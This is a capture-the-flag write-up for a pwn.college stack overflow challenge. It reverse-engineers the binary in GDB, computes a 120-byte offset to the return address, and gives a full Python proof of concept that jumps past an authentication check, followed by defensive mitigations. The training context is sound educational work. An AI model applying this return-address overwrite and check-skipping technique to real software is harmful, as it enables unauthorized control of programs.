# Stage 12: Tricky Control Hijack (Hard) — Reverse Engineering a Stack-Based Control-Flow Hijack

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-2` |
| **VT Score** | N/A |

---

## 1. Challenge Information

| Property | Details |
|---|---|
| Platform | pwn.college |
| Challenge | Tricky Control Hijack (Hard) |
| Architecture | x86-64 |
| Binary format | ELF |
| Vulnerability | Stack-based buffer overflow |
| Input primitive | `read()` |
| Analysis tools | GDB, objdump, Python 3 |
| Exploitation technique | Saved return address overwrite |

### Objective

Exploit a stack-based buffer overflow to redirect execution into `win_authed()` while bypassing its authentication conditional branch.

Unlike the Easy variant, this challenge does not provide helpful stack-layout debugging information or the vulnerable C source code.

The offset and relevant execution addresses must be recovered through binary analysis.

## 2. Initial Reconnaissance

Navigate to the challenge directory:

```bash
cd /challenge
ls -la
```

The challenge provides:

```text
DESCRIPTION.md
binary-exploitation-control-hijack-2
```

Read the challenge description:

```bash
cat DESCRIPTION.md
```

Identify the binary format and architecture:

```bash
file binary-exploitation-control-hijack-2
```

The absence of source code and debugging symbols makes static disassembly and runtime debugging necessary.

## 3. Identifying Relevant Functions

Start GDB:

```bash
gdb -q ./binary-exploitation-control-hijack-2
```

Set Intel assembly syntax:

```gdb
set disassembly-flavor intel
set pagination off
```

Enumerate available functions:

```gdb
info functions
```

Relevant symbols:

```text
0x401c1b  win_authed
0x401d38  challenge
0x401e32  main
```

The vulnerable function is `challenge()`.

Disassemble it:

```gdb
disassemble challenge
```

## 4. Reverse Engineering the Vulnerable Function

Relevant assembly:

```asm
0x401d38 <challenge+0>:   endbr64
0x401d3c <challenge+4>:   push rbp
0x401d3d <challenge+5>:   mov rbp,rsp
0x401d40 <challenge+8>:   sub rsp,0x90
```

The function establishes a stack frame and reserves `0x90` bytes of stack space.

The input-related instructions are:

```asm
0x401ddd: mov rsi,rax
0x401de0: mov edi,0x0
0x401de5: call read@plt
```

The buffer address is calculated immediately before these instructions:

```asm
0x401dd9: lea rax,[rbp-0x70]
```

The `read()` function receives its arguments through the x86-64 System V calling convention:

| Register | Argument |
|---|---|
| RDI | File descriptor |
| RSI | Destination buffer |
| RDX | Number of bytes |

The disassembly establishes that the destination buffer is located at:

```text
rbp - 0x70
```

The maximum read length is initialized to:

```asm
0x401db5: mov QWORD PTR [rbp-0x8],0x1000
```

Therefore, the program permits up to 4096 bytes of input.

## 5. Calculating the Exact Buffer Overflow Offset

The objective is to determine the distance between the beginning of the input buffer and the saved return address.

The stack layout is:

```text
Higher memory addresses
+---------------------------+
| Saved return address      | rbp + 0x8
+---------------------------+
| Saved frame pointer       | rbp
+---------------------------+
| Local variables           |
|                           |
|                           |
+---------------------------+
| Input buffer              | rbp - 0x70
+---------------------------+
Lower memory addresses
```

The saved return address is located at:

```text
rbp + 8
```

The input buffer starts at:

```text
rbp - 0x70
```

Calculate the distance:

```text
(rbp + 8) - (rbp - 0x70) = 0x78

0x78 = 120 bytes
```

The recovered offset is therefore 120 bytes.

### Payload layout

```text
+-----------------------------+
| 120 bytes of padding        |
+-----------------------------+
| 8-byte replacement address  |
+-----------------------------+
```

Total payload size:

```text
120 + 8 = 128 bytes
```

## 6. Analyzing win_authed()

Disassemble the authentication function:

```bash
objdump -d -Mintel binary-exploitation-control-hijack-2 \
  | grep -A 30 '<win_authed>'
```

Function entry:

```text
0x401c1b <win_authed>
```

Relevant instructions:

```asm
401c1b: endbr64
401c1f: push rbp
401c20: mov rbp,rsp
401c23: sub rsp,0x10
401c27: mov DWORD PTR [rbp-0x4],edi
401c2a: cmp DWORD PTR [rbp-0x4],0x1337
401c31: jne 401d35
401c37: lea rdi,[rip+0x3ca]
```

The authentication condition is:

```c
if (token != 0x1337)
    return;
```

The comparison is performed at:

```text
0x401c2a
```

The conditional branch is located at:

```text
0x401c31
```

The instruction immediately following the conditional branch is:

```text
0x401c37
```

### Control-flow analysis

The normal execution path is:

```text
win_authed()
     |
     v
Compare token with 0x1337
     |
     +---- Incorrect token ----> Failure path
     |
     +---- Correct token ------> Flag-printing code
```

For this challenge, the selected control-flow target is:

```text
0x401c37
```

This redirects execution past the authentication comparison.

It is important to distinguish this from satisfying the authentication condition: the exploit bypasses the conditional branch rather than supplying the expected token.

## 7. Exploit Development

The exploit uses Python's `struct` module to encode the target address as an eight-byte little-endian value.

Create the exploit:

```bash
cd ~
nano exploit-hard.py
```

### Complete Python PoC

```python
#!/usr/bin/env python3

import struct
import sys

# Offset recovered from binary disassembly
OFFSET = 120

# Instruction immediately after the authentication branch
TARGET = 0x401c37

# Construct the overflow payload
padding = b"A" * OFFSET

# Encode target as a 64-bit little-endian address
return_address = struct.pack("<Q", TARGET)

# Combine payload components
payload = padding + return_address

# Validate payload size
assert len(payload) == 128

# Output raw bytes
sys.stdout.buffer.write(payload)
```

### Understanding the payload

**Padding:**

```python
padding = b"A" * 120
```

Fills the memory between the input buffer and the saved return address.

**Address packing:**

```python
struct.pack("<Q", TARGET)
```

The `<Q` format means:

- `<`: Little-endian byte order.
- `Q`: Unsigned 64-bit integer.

The target address:

```text
0x401c37
```

Is encoded as:

```text
37 1c 40 00 00 00 00 00
```

**Final payload:**

```text
120 bytes padding + 8 bytes target address
```

Total: 128 bytes.

## 8. Running the Exploit

Execute the Python PoC and pipe its output into the challenge binary:

```bash
python3 ~/exploit-hard.py | /challenge/binary-exploitation-control-hijack-2
```

The payload overwrites the saved return address with the selected instruction address.

When `challenge()` executes its function epilogue:

```asm
leave
ret
```

The `ret` instruction transfers execution to the overwritten address.

Execution resumes at `0x401c37`, after the authentication conditional branch.

## 9. Final Exploit Parameters

| Parameter | Recovered value |
|---|---|
| Architecture | x86-64 |
| Vulnerable function | `challenge()` |
| Input function | `read@plt` |
| Input buffer | `rbp - 0x70` |
| Saved frame pointer | `rbp` |
| Saved return address | `rbp + 8` |
| Buffer-to-RIP offset | 120 bytes |
| Authentication function | `0x401c1b` |
| Authentication comparison | `0x401c2a` |
| Conditional branch | `0x401c31` |
| Post-check target | `0x401c37` |
| Payload length | 128 bytes |

## 10. Root Cause and Defensive Mitigations

The underlying vulnerability is an unchecked input operation that allows more data to be written into a stack buffer than its intended capacity.

The consequences include corruption of adjacent stack data and the saved return address.

Relevant defensive measures:

**1. Input validation and bounds checking**

Ensure that input operations never write beyond the destination buffer's allocated capacity.

**2. Stack canaries**

Detect stack corruption before a function returns.

**3. Address Space Layout Randomization (ASLR)**

Randomize memory locations to make fixed-address exploitation more difficult.

**4. Position Independent Executables (PIE)**

Allow executable code locations to be randomized.

**5. Non-executable stack (NX)**

Prevent execution of injected code from non-executable memory regions. NX alone does not prevent code-reuse attacks.

**6. Control-Flow Integrity (CFI)**

Restrict execution transfers to permitted control-flow destinations.

## 11. Key Takeaways

This challenge demonstrates a practical binary exploitation workflow:

1. Enumerate symbols and identify relevant functions.
2. Reverse-engineer the vulnerable function without source code.
3. Identify the input primitive and buffer address.
4. Recover the saved return-address offset mathematically.
5. Analyze conditional branches inside the target function.
6. Construct a little-endian overwrite payload.
7. Redirect execution through a controlled return address.

The main difference between Easy and Hard was not the vulnerability itself, but the information available to the attacker.

In Hard, the stack layout had to be reconstructed from assembly rather than obtained from challenge-generated debugging output.

- **Challenge:** Tricky Control Hijack (Hard)
- **Platform:** pwn.college
- **Focus:** Binary Reverse Engineering and Stack-Based Control-Flow Hijacking

Tags: #BinaryExploitation #ReverseEngineering #PwnCollege #ExploitDevelopment #GDB #Assembly #LinuxSecurity
